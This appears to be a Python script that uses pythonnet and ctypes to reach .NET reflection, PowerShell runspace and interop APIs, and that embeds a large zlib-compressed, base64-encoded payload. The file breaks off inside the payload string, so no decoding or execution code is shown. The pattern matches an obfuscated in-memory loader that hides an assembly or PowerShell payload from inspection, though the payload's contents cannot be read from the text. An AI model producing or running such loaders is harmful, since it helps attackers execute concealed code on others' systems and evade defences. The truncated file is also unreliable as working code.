import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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